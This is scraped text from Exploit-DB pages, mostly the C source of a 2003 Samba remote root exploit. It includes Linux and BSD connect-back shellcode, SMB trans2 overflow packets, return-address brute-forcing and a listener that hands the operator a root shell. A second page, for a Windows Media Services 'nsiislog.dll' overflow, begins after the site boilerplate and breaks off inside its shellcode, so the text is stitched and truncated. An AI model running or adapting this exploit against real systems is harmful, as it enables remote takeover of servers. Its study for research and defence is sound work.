*/"\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68""\x2d\x63\x89\xe3\x50\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50""\x89\xe1\x31\xc0\x50\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68""\x54\x45\x52\x4d\x89\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73""\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\xb0""\x01\xcd\x80"/* connect back shellcode (port=0xb0ef) */"\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51""\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3""\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1""\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80""\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3""\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f""\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0""\x01\xcd\x80";charbsd_connect_back[] =/* fork(), execve sh -c [client] [host to bounce to], term=xterm */"\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20""\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68\x2d\x63\x89\xe3\x50""\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50\x89\xe1\x31\xc0\x50""\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68\x54\x45\x52\x4d\x89""\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""\x69\x89\xe3\x50\x52\x51\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0""\x01\xcd\x80"/* connect back shellcode (port=0xb0ef) */"\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0""\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef""\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0""\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52""\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31""\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54""\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";typedef struct {unsigned char type;unsigned char flags;unsigned short length;} NETBIOS_HEADER;typedef struct {unsigned char protocol[4];unsigned char command;unsigned short status;unsigned char reserved;unsigned char  flags;unsigned short flags2;unsigned char  pad[12];unsigned short tid;unsigned short pid;unsigned short uid;unsigned short mid;} SMB_HEADER;pid_t childs[50];int LOOP = 1;struct sockaddr_in serv_addr;int sock_listen, client;int exploit_pid;int listen_pid;int port_listen = 45295;voidusage(char *prog){int i;fprintf(stdout, "Samba < 2.2.8 Remote Root exploit by Schizoprenic\n""Connect back method, Xnuxer-Labs, 2003.\n""Usage  : %s   \n""Targets:\n""         0 = Linux\n""         1 = FreeBSD/NetBSD\n""         2 = OpenBSD 3.0 and prior\n""         3 = OpenBSD 3.2 - non-exec stack\n\n", prog);exit(1);}intConnect(int fd, char *ip, unsigned int port, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   connect_read, connect_write;struct timeval           timeout;int                      getsockopt_length = 0;int                      getsockopt_error = 0;struct sockaddr_in       server;bzero(&server, sizeof(server));server.sin_family = AF_INET;inet_pton(AF_INET, ip, &server.sin_addr);server.sin_port = htons(port);if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return -1;}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return -1;}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&connect_read);FD_ZERO(&connect_write);FD_SET(fd, &connect_read);FD_SET(fd, &connect_write);if((connect(fd, (struct sockaddr *) &server, sizeof(server))) < 0) {if(errno != EINPROGRESS) {close(fd);return -1;}}else {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}select_status = select(fd + 1, &connect_read, &connect_write, NULL, &timeout);if(select_status == 0) {close(fd);return -1;}if(select_status == -1) {close(fd);return -1;}if(FD_ISSET(fd, &connect_read) || FD_ISSET(fd, &connect_write)) {if(FD_ISSET(fd, &connect_read) && FD_ISSET(fd, &connect_write)) {getsockopt_length = sizeof(getsockopt_error);if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &getsockopt_error, &getsockopt_length)< 0) {errno = ETIMEDOUT;close(fd);return -1;}if(getsockopt_error == 0) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {errno = getsockopt_error;close(fd);return (-1);}}}else {close(fd);return 1;}if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}intread_timer(int fd, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   fdread;struct timeval           timeout;if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return (-1);}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return (-1);}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&fdread);FD_SET(fd, &fdread);select_status = select(fd + 1, &fdread, NULL, NULL, &timeout);if(select_status == 0) {close(fd);return (-1);}if(select_status == -1) {close(fd);return (-1);}if(FD_ISSET(fd, &fdread)) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {close(fd);return 1;}}intwrite_timer(int fd, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   fdwrite;struct timeval           timeout;if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return (-1);}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return (-1);}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&fdwrite);FD_SET(fd, &fdwrite);select_status = select(fd + 1, NULL, &fdwrite, NULL, &timeout);if(select_status == 0) {close(fd);return -1;}if(select_status == -1) {close(fd);return -1;}if(FD_ISSET(fd, &fdwrite)) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {close(fd);return -1;}}intstart_session(int sock){char buffer[1000];char response[4096];char session_data1[] 	= "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";char session_data2[] 	= "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79""\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type 	= 0x00;         /* session message */netbiosheader->flags 	= 0x00;netbiosheader->length 	= htons(0x2E);smbheader->protocol[0] 	= 0xFF;smbheader->protocol[1] 	= 'S';smbheader->protocol[2] 	= 'M';smbheader->protocol[3] 	= 'B';smbheader->command 	= 0x73;         /* session setup */smbheader->flags 	= 0x08;         /* caseless pathnames */smbheader->flags2 	= 0x01;         /* long filenames supported */smbheader->pid 		= getpid() & 0xFFFF;smbheader->uid          = 100;smbheader->mid 		= 0x01;memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1,sizeof(session_data1) - 1);if(write_timer(sock, 3) == 1)if (send(sock, buffer, 50, 0) < 0) return -1;memset(response, 0x00, sizeof(response));if (read_timer(sock, 3) == 1)if (read(sock, response, sizeof(response) - 1) < 0) return -1;netbiosheader = (NETBIOS_HEADER *)response;smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));//if (netbiosheader->type != 0x00) fprintf(stderr, "+ Recieved a non session message\n");netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));memset(buffer, 0x00, sizeof(buffer));netbiosheader->type     = 0x00;         /* session message */netbiosheader->flags    = 0x00;netbiosheader->length   = htons(0x3C);smbheader->protocol[0]  = 0xFF;smbheader->protocol[1]  = 'S';smbheader->protocol[2]  = 'M';smbheader->protocol[3]  = 'B';smbheader->command      = 0x70;         /* start connection */smbheader->pid          = getpid() & 0xFFFF;smbheader->tid		= 0x00;smbheader->uid          = 100;memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2)- 1);if(write_timer(sock, 3) == 1)if (send(sock, buffer, 64, 0) < 0) return -1;memset(response, 0x00, sizeof(response));if (read_timer(sock, 3) == 1)if (read(sock, response, sizeof(response) - 1) < 0) return -1;netbiosheader = (NETBIOS_HEADER *)response;smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));if (netbiosheader->type != 0x00) return -1;return 0;}intexploit_normal(int sock, unsigned long ret, char *shellcode){char buffer[4000];char exploit_data[] ="\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x90";int i = 0;unsigned long dummy = ret - 0x90;NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type             = 0x00;         /* session message */netbiosheader->flags            = 0x04;netbiosheader->length           = htons(2096);smbheader->protocol[0]          = 0xFF;smbheader->protocol[1]          = 'S';smbheader->protocol[2]          = 'M';smbheader->protocol[3]          = 'B';smbheader->command              = 0x32;         /* SMBtrans2 */smbheader->tid			= 0x01;smbheader->uid                  = 100;memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data),0x90, 3000);buffer[1096] = 0xEB;buffer[1097] = 0x70;for (i = 0; i < 4 * 24; i += 8) {memcpy(buffer + 1099 + i, &dummy, 4);memcpy(buffer + 1103 + i, &ret,   4);}memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),exploit_data, sizeof(exploit_data) - 1);memcpy(buffer + 1800, shellcode, strlen(shellcode));if(write_timer(sock, 3) == 1) {if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;return 0;}return -1;}intexploit_openbsd32(int sock, unsigned long ret, char *shellcode){char buffer[4000];char exploit_data[] ="\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x90";int i = 0;unsigned long dummy = ret - 0x30;NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type             = 0x00;         /* session message */netbiosheader->flags            = 0x04;netbiosheader->length           = htons(2096);smbheader->protocol[0]          = 0xFF;smbheader->protocol[1]          = 'S';smbheader->protocol[2]          = 'M';smbheader->protocol[3]          = 'B';smbheader->command              = 0x32;         /* SMBtrans2 */smbheader->tid                  = 0x01;smbheader->uid                  = 100;memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data),0x90, 3000);for (i = 0; i < 4 * 24; i += 4)memcpy(buffer + 1131 + i, &dummy, 4);memcpy(buffer + 1127, &ret,      4);memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),exploit_data, sizeof(exploit_data) - 1);memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));if(write_timer(sock, 3) == 1) {if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;return 0;}return -1;}void shell(int sock){fd_set  fd_read;char buff[1024], *cmd="uname -a;id;\n";int n;send(sock, cmd, strlen(cmd), 0);while(1) {FD_SET(sock,&fd_read);FD_SET(0,&fd_read);if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;if( FD_ISSET(sock, &fd_read) ) {n=read(sock,buff,sizeof(buff));if (n == 0) {printf ("Connection closed.\n");exit(EXIT_FAILURE);} else if (n < 0) {perror("read remote");exit(EXIT_FAILURE);}write(1,buff,n);}if ( FD_ISSET(0, &fd_read) ) {if((n=read(0,buff,sizeof(buff)))<=0){perror ("read user");exit(EXIT_FAILURE);}write(sock,buff,n);}}close(sock);}void GoAway(){exit(0);}void start_listen(){FILE *fstat;int cpid;LISTENER:bzero(&serv_addr, sizeof(serv_addr));serv_addr.sin_family=2;serv_addr.sin_addr.s_addr=0;serv_addr.sin_port=htons(port_listen);sock_listen=socket(2,1,6);if(bind(sock_listen,(struct sockaddr *)&serv_addr,16)){port_listen++;goto LISTENER;}if(listen(sock_listen,1)){perror("listen");exit(1);}fprintf(stdout, "[+] Listen on port: %d\n",port_listen);cpid = fork();if (cpid) {client=accept(sock_listen,0,0);LOOP = 0;kill(SIGUSR2, exploit_pid);if (client > 0) {fprintf(stdout, "[+] Yeah, I have a root ....!\n""------------------------------\n");fstat=fopen(".ROOT", "a");  //needed by mass.cfclose(fstat);shell(client);}exit(0);}}intmain (int argc,char *argv[]){char *shellcode = NULL;int typeos	= -1;int port		= 139;int sock		= 0;int i		= 0;int status	= 0;int m		= 0;int ip1		= 0;int ip2		= 0;int ip3		= 0;int ip4		= 0;int sta		= 0;int STEPS	= 512;int ENDLOOP    = 64;char *desc;unsigned long MAX_CHILDS  = 40;unsigned long ret         = 0x0;unsigned short int  a_port;struct sockaddr_in addr1;struct hostent *he;struct stat st;if (argc != 4) usage(argv[0]);typeos = atoi(argv[1]);if (typeos > 3) {fprintf(stdout, "Os type out of list!\n");exit(1);}he = gethostbyname(argv[2]);if (he == NULL) {fprintf(stderr, "Unable to resolve\n");return -1;}listen_pid = getpid();start_listen();exploit_pid = listen_pid + 1;//fprintf(stdout, "[+] Listen pid: %d, exploit pid: %d\n", listen_pid,exploit_pid);sscanf(argv[3], "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);linux_connect_back[171] = ip1; bsd_connect_back[162] = ip1;linux_connect_back[172] = ip2; bsd_connect_back[163] = ip2;linux_connect_back[173] = ip3; bsd_connect_back[164] = ip3;linux_connect_back[174] = ip4; bsd_connect_back[165] = ip4;fprintf(stdout, "[+] Connecting back to: [%d.%d.%d.%d:%d]\n",ip1, ip2, ip3, ip4, port_listen);a_port = htons(port_listen);linux_connect_back[177]= (a_port) & 0xff;linux_connect_back[178]= (a_port >> 8) & 0xff;bsd_connect_back[168]= (a_port) & 0xff;bsd_connect_back[169]= (a_port >> 8) & 0xff;switch(typeos) {case 0:desc = "Linux";ret = 0xc0000000;shellcode = linux_connect_back;break;case 1:desc = "FreeBSD/NetBSD";ret = 0xbfc00000;shellcode = bsd_connect_back;break;case 2:desc = "OpenBSD 3.1 and prior";ret = 0xdfc00000;shellcode = bsd_connect_back;break;case 3:desc = "OpenBSD 3.2 non-exec stack";ret = 0x00170000;shellcode = bsd_connect_back;break;}fprintf(stdout, "[+] Target: %s\n", desc);memcpy(&addr1.sin_addr, he->h_addr, he->h_length);addr1.sin_family = AF_INET;addr1.sin_port	 = htons(port);fprintf(stdout, "[+] Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr),port);fprintf(stdout, "[+] Please wait in seconds...!\n");signal(SIGUSR2, GoAway);for (i = 0; i < 50; i++) childs[i] = -1;i = 0; m = 0;while (LOOP) {if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {fprintf(stderr, "[+] socket() error.\n");exit(-1);}ret -= STEPS; i++;if ((ret & 0xff) == 0x00 && typeos != 3) ret++;m++;//fflush(0);//fprintf(stdout, "[+] Return Address: 0x%08x [%02d]\n", (unsigned int)ret,m);usleep(150000);switch (childs[i] = fork()) {case 0:if (connect(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) {//fprintf(stderr, "[+] connect() error.\n");close(sock);exit(-1);}start_session(sock);sleep(3);if (typeos != 3) {if (exploit_normal(sock, ret, shellcode) < 0) {//fprintf(stderr, " -> Failed.\n");close(sock);exit(-1);}} else {if (exploit_openbsd32(sock, ret, shellcode) < 0) {//fprintf(stderr, " -> Failed.\n");close(sock);exit(-1);}}sleep(5);close(sock);exit(0);break;case -1:exit(-1);break;default:if (i > MAX_CHILDS - 2) {wait(&status);i--;}break;}if (m == ENDLOOP) LOOP = 0;}if (stat(".ROOT", &st) != -1)kill(SIGUSR2, listen_pid);else {fprintf(stdout, "[+] Dohh, exploit failed.\n");close(client); close(sock_listen);kill(listen_pid, SIGUSR2);sleep(2);exit(0);}}// milw0rm.com [2003-07-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 56
Microsoft Windows Media Services - 'nsiislog.dll' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Media Services - 'nsiislog.dll' Remote OverflowEDB-ID:56CVE:2003-0227EDB Verified:Author:anonymousType:remoteExploit:/Platform:WindowsDate:2003-07-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#include <stdio.h>#include <winsock2.h>#include <stdlib.h>#include <errno.h>#include <string.h>char        *hostName = NULL;unsigned char shellcode[]="\x90\xeb\x03\x5d\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc5\x15\x90\x90""\x90\x8b\xc5\x33\xc9\x66\xb9\x10\x03\x50\x80\x30\x97\x40\xe2\xfa""\x7e\x8e\x95\x97\x97\xcd\x1c\x4d\x14\x7c\x90\xfd\x68\xc4\xf3\x36""\x97\x97\x97\x97\xc7\xf3\x1e\xb2\x97\x97\x97\x97\xa4\x4c\x2c\x97""\x97\x77\xe0\x7f\x4b\x96\x97\x97\x16\x6c\x97\x97\x68\x28\x98\x14""\x59\x96\x97\x97\x16\x54\x97\x97\x96\x97\xf1\x16\xac\xda\xcd\xe2""\x70\xa4\x57\x1c\xd4\xab\x94\x54\xf1\x16\xaf\xc7\xd2\xe2\x4e\x14""\x57\xef\x1c\xa7\x94\x64\x1c\xd9\x9b\x94\x5c\x16\xae\xdc\xd2\xc5""\xd9\xe2\x52\x16\xee\x93\xd2\xdb\xa4\xa5\xe2\x2b\xa4\x68\x1c\xd1""\xb7\x94\x54\x1c\x5c\x94\x9f\x16\xae\xd0\xf2\xe3\xc7\xe2\x9e\x16""\xee\x93\xe5\xf8\xf4\xd6\xe3\x91\xd0\x14\x57\x93\x7c\x72\x94\x68""\x94\x6c\x1c\xc1\xb3\x94\x6d\xa4\x45\xf1\x1c\x80\x1c\x6d\x1c\xd1""\x87\xdf\x94\x6f\xa4\x5e\x1c\x58\x94\x5e\x94\x5e\x94\xd9\x8b\x94""\x5c\x1c\xae\x94\x6c\x7e\xfe\x96\x97\x97\xc9\x10\x60\x1c\x40\xa4""\x57\x60\x47\x1c\x5f\x65\x38\x1e\xa5\x1a\xd5\x9f\xc5\xc7\xc4\x68""\x85\xcd\x1e\xd5\x93\x1a\xe5\x82\xc5\xc1\x68\xc5\x93\xcd\xa4\x57""\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x13\x5e\xe3\x9e\xc5\xc1\xc4""\x68\x85\xcd\x3c\x75\x7f\xd1\xc5\xc1\x68\xc5\x93\xcd\x1c\x4f\xa4""\x57\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x17\x6e\x95\xe3\x9e\xc5""\xc1\xc4\x68\x85\xcd\x3c\x75\x70\xa4\x57\xc7\xd7\xc7\xd7\xc7\x68""\xc0\x7f\x04\xfd\x87\xc1\xc4\x68\xc0\x7b\xfd\x95\xc4\x68\xc0\x67""\xa4\x57\xc0\xc7\x27\x9b\x3c\xcf\x3c\xd7\x3c\xc8\xdf\xc7\xc0\xc1""\x3a\xc1\x68\